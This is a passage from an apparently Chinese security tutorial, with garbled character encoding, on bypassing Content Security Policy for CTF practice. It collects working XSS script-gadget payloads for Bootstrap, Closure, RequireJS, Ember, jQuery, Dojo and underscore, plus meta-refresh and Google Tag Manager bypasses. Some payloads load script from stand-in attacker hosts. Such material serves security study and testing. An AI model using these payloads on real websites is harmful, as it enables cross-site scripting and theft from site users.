å¿«æ·ã€‚</blockquote><div class="highlight"><pre><code class="language-text">&lt;div data-toggle=tooltip data-html=true title=&#39;&lt;script&gt;alert(1)&lt;/script&gt;&#39;&gt;</code></pre></div><p>HTML é˜²æŠ¤å…è®¸ title å±æ€§ï¼Œå› ä¸ºå®ƒé€šå¸¸æ˜¯å®‰å…¨çš„ã€‚ä½†å½“ä¸å¼•å¯¼å’Œå…¶ä»–æ•°æ®å±æ€§ä¸€èµ·ä½¿ç”¨æ—¶ï¼Œå°±ä¸ä¸€æ ·äº†ã€‚</p><p>--------------------------------</p><p>Closure ç±»æ£€æµ‹å®ƒè‡ªå·±çš„è„šæœ¬ URLï¼Œç„¶åä»ç›¸åŒçš„ä½ç½®åŠ è½½å­èµ„æºã€‚é€šè¿‡æ³¨å…¥å…¶ä»– HTML æ ‡ç­¾ï¼Œå¾ˆå¯èƒ½ä¼šæŠŠ Closure ä¸ä»å…¶ä»–åœ°æ–¹åŠ è½½æ··æ·†:</p><div class="highlight"><pre><code class="language-text">&lt;a id=CLOSURE_BASE_PATH href=data:/,1/alert(1)//&gt;&lt;/a&gt;
&lt;form id=CLOSURE_UNCOMPILED_DEFINES&gt;
&lt;input id=goog.ENABLE_CHROME_APP_SAFE_SCRIPT_LOADING&gt;&lt;/form&gt;</code></pre></div><p>--------------------------------</p><p>Require JS å…è®¸ç”¨æˆ·æŒ‡å®š JavaScript æ–‡ä»¶çš„â€œmainâ€æ¨¡å—ï¼Œè¿™æ˜¯é€šè¿‡è‡ªå®šä¹‰æ•°æ®å±æ€§å®Œæˆçš„ï¼Œè€Œ XSS è¿‡æ»¤å™¨å’Œå…¶ä»–ç¼“è§£æœºåˆ¶å¹¶ä¸çŸ¥é“è¿™ä¸ªæ•°æ®å±æ€§ã€‚</p><div class="highlight"><pre><code class="language-text">&lt;script data-main=&#39;data:1,alert(1)&#39; src=&#39;require.js&#39;&gt;&lt;/script&gt;</code></pre></div><p>--------------------------------</p><p>è¿™æ˜¯ä¸€ä¸ª inert è„šæœ¬æ ‡ç­¾ï¼š</p><div class="highlight"><pre><code class="language-text">&lt;script src=//i.am.an.invalid.self.closing.script.tag csp=ignores-me /&gt;</code></pre></div><p>Ember*dev ç‰ˆæœ¬åªåˆ›å»ºä¸€ä¸ªæœ‰æ•ˆçš„å‰¯æœ¬å¹¶é‡æ–°æ’å…¥å®ƒã€‚è‡ªä» strict-dynamic CSP å…è®¸åŠ¨æ€æ’å…¥è„šæœ¬ï¼Œç”¨è¿™ä¸ª payload ç»•è¿‡å®ƒï¼š</p><div class="highlight"><pre><code class="language-text">&lt;script type=text/x-handlebars&gt;
 &lt;script src=//attacker.example.com// /&gt;
&lt;/script&gt;
</code></pre></div><p>--------------------------------</p><p>jQuery æœ‰ä¸€ä¸ªå°å·¥å…·ï¼Œå®ƒæ¥å—ç°æœ‰çš„</p><div class="highlight"><pre><code class="language-text">&lt;form class=&#34;child&#34;&gt;
&lt;input name=&#34;ownerDocument&#34;/&gt;&lt;script&gt;alert(1);&lt;/script&gt;&lt;/form&gt;</code></pre></div><p>ä¸¥æ ¼åŠ¨æ€çš„ CSP é˜»å¡&lt;script&gt;ï¼Œç„¶å jQuery é‡æ–°æ’å…¥å®ƒã€‚ç°åœ¨å®ƒè¢«ä¿¡ä»»å¹¶å°†æ‰§è¡Œã€‚</p><p>--------------------------------</p><ol><li>ç»•è¿‡ CSP strict-dynamic via Bootstrap</li></ol><div class="highlight"><pre><code class="language-text">&lt;div data-toggle=tooltip data-html=true title=&#39;&lt;script&gt;alert(1)&lt;/script&gt;&#39;&gt;&lt;/div&gt;</code></pre></div><p>2. jQuery Mobile ç»•è¿‡æ€æ¯’è½¯ä»¶</p><div class="highlight"><pre><code class="language-text">&lt;div data-role=popup id=&#39;--&gt;&lt;script&gt;alert(1)&lt;/script&gt;&#39;&gt;&lt;/div&gt;
</code></pre></div><p>3. Closure ç»•è¿‡ NoScript (DOM clobbering)</p><div class="highlight"><pre><code class="language-text">&lt;a id=CLOSURE_BASE_PATH href=http://attacker/xss&gt;&lt;/a&gt;
</code></pre></div><p>4. Dojo Toolkit ç»•è¿‡ ModSecurity CRS</p><div class="highlight"><pre><code class="language-text">&lt;div data-dojo-type=&#34;dijit/Declaration&#34; data-dojo-props=&#34;}-alert(1)-{&#34;&gt;
</code></pre></div><p>5. underscore æ¨¡æ¿ç»•è¿‡ CSP unsafe-eval</p><div class="highlight"><pre><code class="language-text">&lt;div type=underscore/template&gt; &lt;% alert(1) %&gt; &lt;/div&gt;</code></pre></div><p>åˆ©ç”¨æ¡ä»¶:  </p><ul><li>CDNæœåŠ¡å•†å­˜åœ¨æŸäº›ä½ç‰ˆæœ¬çš„jsåº“</li><li>æ­¤CDNæœåŠ¡å•†åœ¨CSPç™½åå•ä¸­</li></ul><p><b>metaç½‘é¡µè·³è½¬ç»•è¿‡</b></p><p>è¿™ä¸ªæƒ…å†µçš„è¯ï¼Œå¯ä»¥åˆ©ç”¨ meta æ ‡ç­¾å®ç°ç½‘é¡µè·³è½¬ï¼š</p><div class="highlight"><pre><code class="language-text">127.0.0.1/csp/?twosecurity=&lt;meta http-equiv=&#34;refresh&#34; content=&#34;1;url=http://x.x.x.x/&#34; &gt;</code></pre></div><p><b>ç«™ç‚¹å¯æ§é™æ€èµ„æºç»•è¿‡</b></p><p>ç»™ä¸€ä¸ªç»•è¿‡ codimd çš„ codimd xss </p><p>ä¾‹å­ä¸­ codimd çš„ CSP ä¸­ä½¿ç”¨äº† google-analyticsï¼Œè€Œ analytics ä¸­æä¾›äº†è‡ªå®šä¹‰ javascript çš„åŠŸèƒ½ï¼ˆgoogleä¼šå°è£…è‡ªå®šä¹‰çš„jsï¼Œæ‰€ä»¥è¿˜éœ€è¦ unsafe-evalï¼‰ï¼Œäºæ˜¯å¯ä»¥ç»•è¿‡ CSPã€‚</p><div class="highlight"><pre><code class="language-text">&lt;meta http-equiv=&#34;Content-Security-Policy&#34; content=&#34;default-src &#39;self&#39;; script-src &#39;unsafe-eval&#39; https://www.google-analytics.com&#34;&gt;
&lt;script src=&#34;https://www.google-analytics.com/gtm/js?id=GTM-PJF5W64&#34;&gt;&lt;/script&gt;</code></pre></div><p>æœ‰å…³ <b>CSPç»•è¿‡ </b>çš„å†…å®¹å°±ç®€å•ä»‹ç»åˆ°è¿™é‡Œã€‚æ›´å¤šæœ‰å…³ CTF çš„å†…å®¹è¯·å‰å¾€ <a href="https://link.zhihu.com/?target=https%3A//twosecurity.cn/%3Fquery_ref%3DqGLdXm" class=" wrap external" target="_blank" rel="nofollow noreferrer">äºŒå‘ç®”å®‰å…¨</a> è¿›è¡Œå­¦ä¹ ï¼Œæœ€è¿‘æ¨å‡ºäº†ä¸€ç³»åˆ—å…è´¹çš„ç½‘ç»œå®‰å…¨æŠ€èƒ½åŒ…ï¼Œæœ‰å…³CTFã€æ¸—é€æµ‹è¯•ã€ç½‘ç»œæ”»é˜²ã€é»‘å®¢æŠ€å·§å°½åœ¨å…¶ä¸­ï¼Œå­¦å®ƒæ¶¨å§¿åŠ¿ğŸ’¯ã€‚</p><figure data-size="normal"><noscript><img src="https://pic2.zhimg.com/v2-bacc5586a9947727c6c17bbaff0c6df1_b.jpg" data-caption="" data-size="normal" data-rawwidth="720" data-rawheight="403" class="origin_image zh-lightbox-thumb" width="720" data-original="https://pic2.zhimg.com/v2-bacc5586a9947727c6c17bbaff0c6df1_r.jpg"/></noscript><img src="https://pic2.zhimg.com/v2-bacc5586a9947727c6c17bbaff0c6df1_b.jpg" data-caption="" data-size="normal" data-rawwidth="720" data-rawheight="403" class="origin_image zh-lightbox-thumb lazy" width="720" data-original="https://pic2.zhimg.com/v2-bacc5586a9947727c6c17bbaff0c6df1_r.jpg" data-actualsrc="https://pic2.zhimg.com/v2-bacc5586a9947727c6c17bbaff0c6df1_b.jpg"/></figure><p></p>